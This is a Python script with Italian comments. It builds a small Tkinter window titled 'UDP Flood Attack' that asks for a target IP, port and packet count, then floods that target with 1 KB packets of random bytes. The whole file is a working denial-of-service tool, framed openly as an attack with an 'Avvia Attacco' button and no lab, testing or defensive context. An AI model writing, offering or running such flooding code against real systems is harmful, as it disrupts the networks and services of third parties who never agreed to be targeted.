import socket
import random
import ipaddress
from tkinter import Tk, Label, Entry, Button, messagebox

def udp_flood(target_ip, target_port, num_packets):
    try:
        #creazione del socket UDP
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        #generazione del pacchetto da 1 KB
        packet_size = 1024  #dimensione fissa di 1 KB
        data = bytes([random.randint(0, 255) for _ in range(packet_size)])

        for i in range(num_packets):
            udp_socket.sendto(data, (target_ip, target_port))
            if i % 1000 == 0:  #messaggio ogni 1000 pacchetti inviati
                print(f"Pacchetti inviati: {i}")

        messagebox.showinfo("Completato", "Attacco UDP Flood completato.")
    except Exception as e:
        messagebox.showerror("Errore", f"Errore UDP Flood: {e}")
    finally:
        udp_socket.close()

def start_attack():
    #recupero valori GUI
    target_ip = ip_entry.get()
    target_port = port_entry.get()
    num_packets = packets_entry.get()

    #validazione input
    try:
        ipaddress.ip_address(target_ip)
    except ValueError:
        messagebox.showerror("Errore", "Indirizzo IP non valido.")
        return

    try:
        target_port = int(target_port)
        if not (1 <= target_port <= 65535):
            raise ValueError
    except ValueError:
        messagebox.showerror("Errore", "La porta deve essere un numero tra 1 e 65535.")
        return

    try:
        num_packets = int(num_packets)
        if num_packets <= 0:
            raise ValueError
    except ValueError:
        messagebox.showerror("Errore", "Il numero di pacchetti deve essere un numero intero positivo.")
        return

    #avvio attacco
    udp_flood(target_ip, target_port, num_packets)

#creazione della GUI
root = Tk()
root.title("UDP Flood Attack")

#IP target
Label(root, text="Indirizzo IP Target:").grid(row=0, column=0, padx=10, pady=10)
ip_entry = Entry(root, width=30)
ip_entry.grid(row=0, column=1, padx=10, pady=10)

#porta target
Label(root, text="Porta Target:").grid(row=1, column=0, padx=10, pady=10)
port_entry = Entry(root, width=30)
port_entry.grid(row=1, column=1, padx=10, pady=10)

#numero di pacchetti
Label(root, text="Numero di Pacchetti:").grid(row=2, column=0, padx=10, pady=10)
packets_entry = Entry(root, width=30)
packets_entry.grid(row=2, column=1, padx=10, pady=10)

#avvio attacco
start_button = Button(root, text="Avvia Attacco", command=start_attack, bg="red", fg="white")
start_button.grid(row=3, column=0, columnspan=2, pady=20)

#avvio GUI
root.mainloop()